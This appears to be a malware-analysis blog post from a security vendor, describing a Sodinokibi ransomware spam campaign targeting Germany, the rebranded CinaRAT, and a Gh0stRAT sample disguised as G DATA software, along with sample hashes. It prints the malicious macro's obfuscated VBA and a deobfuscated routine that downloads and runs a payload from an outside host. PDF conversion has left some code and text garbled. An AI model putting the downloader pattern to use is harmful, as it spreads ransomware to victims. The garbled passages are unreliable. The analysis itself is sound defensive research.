ⓔ Topics ✔

#### 06/04/2019

# Strange Bits: Sodinokibi Spam, CinaRAT, and Fake G DATA

(1) Reading time: 3 min (811 words)

![](_page_0_Picture_6.jpeg)

In the second part of our Strange Bits series we are taking a closer look at Sodinokibi Spam E-Mails, CinaRAT and a Malware that tries to imitate G DATA.

#### "That's strange ..."

Many important discoveries do not start with a shouting of "Eureka" anymore, as they did in the days of old. Instead the most intriguing bits of modern research will at some point contain the phrase "That's strange...", followed by more prodding and – hopefully – a lightbulb moment. This series that we call "Strange Bits" contains many findings that struck our analysts as odd, either because they do not seem to make any sense at the time or because a malicious program exhibits behaviors that none of us have these findings will spark ideas in other fellow researchers - maybe those findings are just what it says on the tin: Strange ....

#### Sodinokibi Ransomware Spam Campaign targets Germany

Sodinokibi ransomware was known so far for being installed via Oracle WebLogic exploit (see Talos' article ( A new campaign uses spam emails with attached MS Office Word document to download Sokinokibi to the target system. JamesWT ( found the first sample, Sculabs ( another one14. The email pretends to be a warning letter from the of public-law broadcasting institutions in the Federal Public of Germany and demands 213.50 EUR payment.

![](_page_1_Picture_0.jpeg)

The attached document has the file name "Mahnbescheid - Antwortbogen - Aktenzeichen 4650969334.doc"[2]. It claims thatlGuard protection is responsible that the actual contents are not visible, to trick the user into enabling Macros.

![](_page_1_Picture_2.jpeg)

Sodinokibi downloader pretends to be protected by Mailguard.

Most of the Macro code in the document looks innocent and is there to divert from the malicious code, which executes on Document\_Open. The obfuscated VBA code uses long scrambled variable and function/sub names, encoded strings, junk parameters and conditions. The unaltered main code is below.

| Sub docUmeNt opeN ( )                                                                           |
|-------------------------------------------------------------------------------------------------|
| AioJV39@(0) = "TwPgELNvMievP,~H"                                                                |
| Αϊδυλ394(1) = "S3ν]hZFNe?Ν610fil?K9.J\RANT2p)Y pIo5le12iI7jc4Zqav utuJpi="ho}4+ndG0"            |
| (céx1a20 = @M2r24x1c1020112KW1zFr (0, -6491, -6012) ) + üDFW 30frhZcu-We("\)/?Mtxail" ycD.pr, 3 |
| Call NqBBp7qCwMGVYWeNUrpXVqBfVWeNUrpXVpyNeGBx8cxyXNqBBp7qCwNnGVXVpyNwgBwRxjyXgyXNqBlfp7QCwNnf   |
| CreateObject(üDFW´³©¥nhEcu¬•Né(Z®»6û«¿KWiæ¬(1, 5279, -6017))).Open (çê½Îâ¿Ø)                    |
| End Sub                                                                                         |

The string decoding function simply extracts every fourth letter from the string. Below is the deobfuscated decoding function.

```
Function DecodeString(EncodedString) As String
   Dim SomeByteArray(1055) As Byte, AnotherByteArray() As Byte
   AnotherByteArray = StrConv(EncodedString, 128) ' vbFromUnicode
   For idx = 0 To UBound(AnotherByteArray) - 1
        If (idx Mod 4 = 0) Then
           SomeByteArray(arrayIndex) = AnotherByteArray(idx)
            arrayIndex = arrayIndex + 1
       End If
   Next idx
   DecodeString = Left(StrConv(SomeByteArray, 64), arrayIndex) ' 64 = vbUnicode
End Function
```
The main code downloads Sodinokibi to TEMP|Microsoft-Word.exe and executes it. It looks as follows after deobfuscation.

| Sub Document Open ( )                                                           |  |  |  |  |  |
|---------------------------------------------------------------------------------|--|--|--|--|--|
| DownloadedFilePath = Environ("TEMP") + "\Microsoft-Word.exe"                    |  |  |  |  |  |
| Call DownloadToFile(0, "hxxp://blaerck.xyz/sabo.exe", DownloadedFilePath, 0, 0) |  |  |  |  |  |
| CreateObject("Shell.Application").Open (DownloadedFilePath)                     |  |  |  |  |  |
| End Sub                                                                         |  |  |  |  |  |

The downloaded file is this Sodinokibi version[3].

![](_page_2_Figure_4.jpeg)

PortExAnalyzer visualization of the packed Sodinokibi ransomware sample

## CinaRAT - Cina is not a Remote Access Tool

G DATA analysts discovered a supposedly new remote access trojan 145. It uses a recursive acronym for its name: "Cina is not a Remote Access Tool)". The sample is packed with VMProtect.

The malware developer, who goes by the name Wearelegal, states on their GitHub repository that the project is based on QuasarRAT. We compared the client stub code of CinaRAT 1.0.1.055 to the client stub code of QuasarRAT 1.3.0.066 with a diff tool JustAssembly ( We found only minor differences, e.g., for the name of the malware, but no added features. That means CinaRAT is a rebranded QuasarRAT.

CinaRAT exists at least since October 2017 which is the release tab. The previous version of CinaRAT had a different name: Yggdrasil.

(/fileadmin/user\_upload/Presse/Deutschland/2019/05/StrangeBits\_CinaRAT\_Yggdrasil.png) The first version of CinaRAT when it was still named "Yggdrasil". The image belongs to the malware author's demo screenshots.

### Gh0stRAT imitates G DATA

We discovered a malware sample that uses G DATA icons and version information[7]. It registers as a service by copying itself to "%PROGRAMFILES%\%s.rar" and running "net start" on the copied file.

ﺔ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤﺘﺤﺪﺓ ﺍﻟﻤ

ר
ע

(/fileadmin/user\_upload/Presse/Deutschland/2019/05/StrangeBitsGhostVersionInfo.png)

Oddly, the sample is signed by "Beijing Kingsoft Security software company. The certificate is not valid. Memory dumps of the sample are identified as Gh0stRAT by this Yara rule (

PortExAnalyzer visualization of the fake G DATA sample

### Referenced Samples

| Description                  | Filename                                                     | SHA256                                                           |
|------------------------------|--------------------------------------------------------------|------------------------------------------------------------------|
| 1   Sodinokibi email         | admin download.eml                                           | 6fe7ec21615ed7dcd3101eb45fe6fe5db2789d7c7e63e67dc51d5fde31bbb22c |
| [2] Sodinokibi<br>downloader | Mahnbescheid - Antwortbogen - Aktenzeichen<br>4650969334.doc | d4e2fbcc71f4d02d01747bdac5806dc56e59cae4409e47867f3365ff998e8803 |
| [3] Sodinokibi binary        | sabo.exe, Microsoft-Word.exe                                 | 5dde3386e0ce769bfd1880175168a71931d1ffb881b5050760c19f46a318efc9 |
| 4  CinaRAT, packed           | Client.exe                                                   | 0af5a83aa182e82b789e7a98f791ce27f40beb92594f5b846c9edb502594e95c |
| 5  CinaRAT stub              | client.bin                                                   | cd882e86983d26511908392d5bd00c0338572b17049a8da7025d24837ecf2b63 |
| 6  QuasarRAT stub            | client hin                                                   | 42b02f1c1118c037f18aa331b8b21a159ba4faf412b3bf319cec6cd4eaaafb9a |
| [7] Gh0stRAT, Fake G<br>DATA | GDWrap.exe, bz.exe                                           | c65530bf0949ff535a92d75498dea01566ce8c7cc52122c61b7ffb762d05ab65 |

#### Related articles:

![](_page_4_Picture_4.jpeg)

05/09/2019

07/04/2019

メ

メ

(

text=Sodinokibi%20Spam%

strange-bits-sodinokibi-spa

| Share Article                                                                                                                                                                |
|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| † ( |
|                                                                                                                                                                              |
| Karsten Hahn                                                                                                                                                                 |
| Principal Malware Researcher                                                                                                                                                 |

Share Article

Back

to

Blog

(/blog)

f ( u=https%3A%2F%2Fwww.gdatasoftware.com%2Fblog%2F2019%2F06%2F31724strange-bits-sodinokibi-spam-cinarat-and-fake-g-data)

( text=Sodinokibi%20Spam%2C% strange-bits-sodinokibi-spam-ciı

#### 圈 Content

#### . "That's strange..."

- Sodinokibi Ransomware Spam Campaign targets Germany
- CinaRAT Cina is not a Remote Access Tool
- Gh0stRAT imitates G DATA
- -- 0-0-0 Referenced Samples
- Related articles

| ೪)  Topics                                    |                     |                        |                                        |  |
|-----------------------------------------------|---------------------|------------------------|----------------------------------------|--|
| Ransomware (/blog/ransomware)                 |                     |                        | CyberCrime (/blog/cybercrime)          |  |
| Security products (/blog/secuerity-produects) | Mails (/blog/mails) | Kurios (/blog/kuerios) | Funny findings (/blog/fuenny-findings) |  |

ou are here: Blog (EN)\_((blog)

![](_page_5_Picture_15.jpeg)